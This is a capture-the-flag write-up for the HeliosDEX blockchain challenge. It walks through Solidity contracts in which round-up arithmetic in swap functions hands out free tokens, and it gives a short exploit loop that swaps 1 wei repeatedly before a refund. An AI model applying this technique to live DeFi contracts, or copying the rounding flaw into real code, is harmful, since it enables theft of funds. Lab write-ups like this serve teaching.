# 🚩 HeliosDEX – Easy

![image](../img/HeliosDEXBanner.png)

- **Category:** Blockchain
- **CTF Event:** Cyber Apocalypse CTF 2025
- **Difficulty:** Easy
- **Points:** 975 Pts

---

## Challenge Description

> You stand victorious, panting, over the fallen form of Eldorion. The beast's eternal resilience proved no match for your cunning and skill, adventurer. The path to the city gates of Eldoria now lies open, but the journey is far from over. As you approach, a shimmering structure catches your eye: the HeliousDEX, a decentralized exchange powered by the radiant energy of Helios himself. Whispers tell of travelers using this exchange to amass fortunes, stocking up on rare items and crucial supplies before braving the perils of Eldoria. Perhaps you can use this opportunity to your advantage...

---

## Challenge Files

- [`HeliosDEX.sol`](src/HeliosDEX.sol)
- [`Setup.sol`](src/Setup.sol)

---

## Objective

### `Setup.sol`

```
pragma solidity ^0.8.28;

import { HeliosDEX } from "./HeliosDEX.sol";

contract Setup {
    HeliosDEX public TARGET;
    address public player;
    
    event DeployedTarget(address at);

    constructor(address _player) payable {
        TARGET = new HeliosDEX{value: 1000 ether}(1000);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return player.balance >= 20 ether;
    }
}
```

According to the `Setup.sol` contract, the main goal is to receive more than 20 ether in the account given by HTB in order to get the flag.

---

## Code Analysis / Vulnerability

### `HeliosDEX.sol`

```
pragma solidity ^0.8.28;

/***
    __  __     ___            ____  _______  __
   / / / /__  / (_)___  _____/ __ \/ ____/ |/ /
  / /_/ / _ \/ / / __ \/ ___/ / / / __/  |   / 
 / __  /  __/ / / /_/ (__  ) /_/ / /___ /   |  
/_/ /_/\___/_/_/\____/____/_____/_____//_/|_|  
                                               
    Today's item listing:
    * Eldorion Fang (ELD): A shard of a Eldorion's fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle.
    * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS.
    * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria's invisible eye.
***/

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

contract EldorionFang is ERC20 {
    constructor(uint256 initialSupply) ERC20("EldorionFang", "ELD") {
        _mint(msg.sender, initialSupply);
    }
}

contract MalakarEssence is ERC20 {
    constructor(uint256 initialSupply) ERC20("MalakarEssence", "MAL") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosLuminaShards is ERC20 {
    constructor(uint256 initialSupply) ERC20("HeliosLuminaShards", "HLS") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosDEX {
    EldorionFang public eldorionFang;
    MalakarEssence public malakarEssence;
    HeliosLuminaShards public heliosLuminaShards;

    uint256 public reserveELD;
    uint256 public reserveMAL;
    uint256 public reserveHLS;
    
    uint256 public immutable exchangeRatioELD = 2;
    uint256 public immutable exchangeRatioMAL = 4;
    uint256 public immutable exchangeRatioHLS = 10;

    uint256 public immutable feeBps = 25;

    mapping(address => bool) public hasRefunded;

    bool public _tradeLock = false;
    
    event HeliosBarter(address item, uint256 inAmount, uint256 outAmount);
    event HeliosRefund(address item, uint256 inAmount, uint256 ethOut);

    constructor(uint256 initialSupplies) payable {
        eldorionFang = new EldorionFang(initialSupplies);
        malakarEssence = new MalakarEssence(initialSupplies);
        heliosLuminaShards = new HeliosLuminaShards(initialSupplies);
        reserveELD = initialSupplies;
        reserveMAL = initialSupplies;
        reserveHLS = initialSupplies;
    }

    modifier underHeliosEye {
        require(msg.value > 0, "HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter");
        _;
    }

    modifier heliosGuardedTrade() {
        require(_tradeLock != true, "HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler");
        _tradeLock = true;
        _;
        _tradeLock = false;
    }

    function swapForELD() external payable underHeliosEye {
        uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
        uint256 fee = (grossELD * feeBps) / 10_000;
        uint256 netELD = grossELD - fee;

        require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveELD -= netELD;
        eldorionFang.transfer(msg.sender, netELD);
        // when msg.value = 12e18, netELD = 24
        emit HeliosBarter(address(eldorionFang), msg.value, netELD);
    }

    function swapForMAL() external payable underHeliosEye {
        uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
        uint256 fee = (grossMal * feeBps) / 10_000;
        uint256 netMal = grossMal - fee;

        require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveMAL -= netMal;
        malakarEssence.transfer(msg.sender, netMal);
        // when msg.value = 12e18, netMal = 48
        emit HeliosBarter(address(malakarEssence), msg.value, netMal);
    }

    function swapForHLS() external payable underHeliosEye {
        uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
        uint256 fee = (grossHLS * feeBps) / 10_000;
        uint256 netHLS = grossHLS - fee;
        
        require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
        

        reserveHLS -= netHLS;
        heliosLuminaShards.transfer(msg.sender, netHLS);
        // when msg.value = 12e18, netHLS = 120
        emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
    }

    function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
        require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
        require(amount > 0, "HeliosDEX: naught for naught is no trade. Offer substance, or be gone!");

        uint256 exchangeRatio;
        
        if (item == address(eldorionFang)) {
            exchangeRatio = exchangeRatioELD;
            require(eldorionFang.transferFrom(msg.sender, address(this), amount), "ELD transfer failed");
            reserveELD += amount;
        } else if (item == address(malakarEssence)) {
            exchangeRatio = exchangeRatioMAL;
            require(malakarEssence.transferFrom(msg.sender, address(this), amount), "MAL transfer failed");
            reserveMAL += amount;
        } else if (item == address(heliosLuminaShards)) {
            exchangeRatio = exchangeRatioHLS;
            require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), "HLS transfer failed");
            reserveHLS += amount;
        } else {
            revert("HeliosDEX: Helios descries forbidden offering");
        }

        // import "@openzeppelin/contracts/utils/math/Math.sol";
        uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio);
        // uint256 public immutable feeBps = 25;
        uint256 fee = (grossEth * feeBps) / 10_000;
        uint256 netEth = grossEth - fee;

        hasRefunded[msg.sender] = true;
        payable(msg.sender).transfer(netEth);
        
        emit HeliosRefund(item, amount, netEth);
    }
}
```

Looking into the `HeliosDEX.sol` file, there are three different kinds of tokens are being created, `EldorionFang` (`ELD`), `MalakarEssence` (`MAL`), and `HeliosLuminaShards` (`HLS`) by using a same token standard, ERC20. 

Rememeber that our main goal is to receive more than 20 ETH, so let's directly find which function has the chance to let us receive ETH. We can find that in the `oneTimeRefund()` function, at the end before the function emitting the `HeliosRefund()` event, it will transfer the msg.sender with an `netEth` amount of ETH. So if the `netEth` is bigger than 20 ether, we will get 20 ETH which is what we want. Let's trace back how `netEth` are being calculated, it is calculated by using `grossEth` to minus the value of `fee`. The `grossEth` is calculated by using a `mulDiv()` function from a library called `Math`, and the only thing we can control in this `mulDiv()` is one of its input parameters, `amount`, this `amount` is actually the amount of the selected ERC20 token that we want to refund. So, as long as the amount that we want to refund is bigger enough, we will get more than 20 ETH. But how we get those ERC20 token? One more point to note in this `oneTimeRefund()` function is that it has applied with a modifier `heliosGuardedTrade()` which only let the msg.sender to call this function one time only, which also means that the msg.sender can only select one of those ERC20 tokens for refunding.

Looking into other main functions of `HeliosDEX` contract, there are three swapping function, the only place that we can receive ERC20 tokens. Each swap function corresponding to swap for each created ERC20 token (`ELD`, `MAL`, `HLS`) by just using ETH for swapping. In those swapping function, there are only two things are different, one is exchanging ratio which doesn't matter in any way, another is the method of calculating the gross of the exchanging token which attually matters in this case. 

```
uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
```

The only thing diffence between them is the fourth input parameter of the `mulDiv()` function. Let's find out why it matters!

```
function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {
        return mulDiv(x, y, denominator) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0);
}
```

The calculations of the gross of each ERC20 token is based on the output of the `mulDiv()` function from the `Math` library as shown in the above ccode snipet. We can see that it return a value from the `mulDiv()` that only with three input parameters  and add up with another value that return from the `toUint()` function which cames from the `SafeCast` library.

```
function toUint(bool b) internal pure returns (uint256 u) {
    assembly ("memory-safe") {
        u := iszero(iszero(b))
    }
}
```

Looking into the `toUint()` function, we can know that it will return `1` if the input parameter `b` is `true`. Looking back to the `mulDiv()` function with four parameters, we can find that the input parameters of `toUint()` is this `(unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0)`. Thus, if this input parameter is `true` then the gross value will be certain value + 1. It also means that we always get atleast one ERC20 token. Well, let's look back to the input parameter of `toUint()`, it will only be true when the `unsignedRoundsUp(rounding)` and `mulmod(x, y, denominator) > 0` return `true`. In this case, as long as we don't put weird number when calling the swaping functions, the value of `mulmod(x, y, denominator) > 0` will always be true. Then, the remaining condition to let `toUint()` to return `true` is `unsignedRoundsUp(rounding)`.

```
function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {
    return uint8(rounding) % 2 == 1;
}
```

As we mentioned before the only thing diffence between them is the fourth input parameter of the `mulDiv()` function, when we thow them into this `unsignedRoundsUp()` function, the result return will also be different:

 - `swapForELD()` = a value + 0
 - `swapForMAL()` = a value + 1
 - `swapForHLS()` = a value + 1

Thus, the is the vulnerability of the swap functions. Even the value is 0, we still get atleast 1 corresponding token when calling the `swapForMAL()` or `swapForHLS()` functions.

```md
🔑 Key Observations

- The `Rounding` input parameters for `mulDiv()` in each swapping function will determine whether to add `1` to the final result -> possible exploit if we keep calling this function to receive many tokens
- The modifier `heliosGuardedTrade()` in the `oneTimeRefund()` function  let msg.sender to call this function in one time only.
```

---

## Exploitation

Since that we know there are two swapping function that will always give us atleast one coresponding ERC20 token even we only sending `1` wei for swapping, we can just keep calling the swapping function to get enough tokens for refunding and get more than 20 ether.

```
uint256 amount = 85;
for(uint256 i = 0; i< amount; i++){
    heliosDex.swapForHLS{value: 1}();
}
heliosDex.heliosLuminaShards().approve(address(heliosDex), amount);
heliosDex.oneTimeRefund(address(heliosDex.heliosLuminaShards()), amount);
```

You may call `swapForMAL()` for swapping as it will also return atleast one `MAL` due to rounding. However, in my solution, I call the `swapForHLS()` 85 times to receive `HLS` tokens by just sending `1` wei for every time. After that I approve the `heliosDex` instance to spend our `HLS` token with a certain allowance, `amount`. It is required before calling the `oneTimeRefund()` function as it has a `transferFrom()` function that will transfer token on behalf of the msg.sender, but it requires the approval from the msg.sender to the spender to get allowance for spending on behalf.

See the full exploitation script [here](script/Exploit.s.sol).

### Command to Deploy the Script

```
forge script script/Exploit.s.sol --broadcast --rpc-url $RPC_URL --private-key $PK
```

Please kindlly save the variables in the `.env` file. However, please don't save your private key in plaint text like this in production!

---